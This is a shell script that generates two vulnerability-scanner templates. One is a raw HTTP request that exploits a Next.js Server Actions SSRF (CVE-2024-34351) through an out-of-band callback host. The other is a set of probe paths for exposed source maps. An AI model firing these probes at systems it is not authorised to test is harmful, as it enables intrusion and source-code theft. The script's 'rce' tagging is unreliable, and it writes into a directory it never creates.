#!/bin/bash
# K70n0s510 REACT/NEXT.JS NUCLEAR PACK
# Targets the critical Server Actions SSRF in modern React apps.

BASE_DIR="$HOME/K70n0s510_templates/owasp-2025"
mkdir -p "$BASE_DIR/A99-critical-cves"

echo "⚛️ Building React/Next.js Nuclear Arsenal..."

# ==========================================
# 1. React/Next.js Server Actions SSRF (CVE-2024-34351)
# ==========================================
cat <<EOF > "$BASE_DIR/A99-critical-cves/CVE-2024-34351-react-ssrf.yaml"
id: CVE-2024-34351-react-ssrf
info:
  name: React/Next.js Server Actions SSRF (Critical)
  author: K70n0s510
  severity: critical
  description: |
    Detects the critical SSRF in React/Next.js Server Actions.
    By manipulating the Host header during a Server Action, an attacker can force the server to fetch internal resources.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-34351
  tags: cve,cve2024,react,nextjs,ssrf,rce
http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{interactsh-url}}
        Content-Type: text/plain
        Next-Action: 26db376097725927517e52b2203362095924713c
        Next-Router-State-Tree: %7B%22src%22%3A%22%22%7D

        {}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"

      # Negative Matcher for WAFs (Akamai/Cloudflare often block this)
      - type: word
        words: ["AkamaiGHost", "Access Denied", "Cloudflare"]
        negative: true
EOF

# ==========================================
# 2. React DevTools & Source Map Exposure (High Value)
# ==========================================
cat <<EOF > "$BASE_DIR/A02-misconfiguration/config-nuclear/react-devtools.yaml"
id: K70n0s510-react-devtools
info:
  name: React DevTools & Source Leak
  author: K70n0s510
  severity: high
  description: Detects exposed React Source Maps and DevTools which leak full frontend source code.
  tags: react,config,exposure
http:
  - method: GET
    path:
      - "{{BaseURL}}/_next/static/development/_buildManifest.js"
      - "{{BaseURL}}/static/js/main.js.map"
      - "{{BaseURL}}/static/js/bundle.js.map"
      - "{{BaseURL}}/_next/source-maps"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "webpack://"
          - "\"sources\":["
          - "react-devtools"
      - type: status
        status: [200]
EOF

echo "✅ React Nuclear Templates Built."
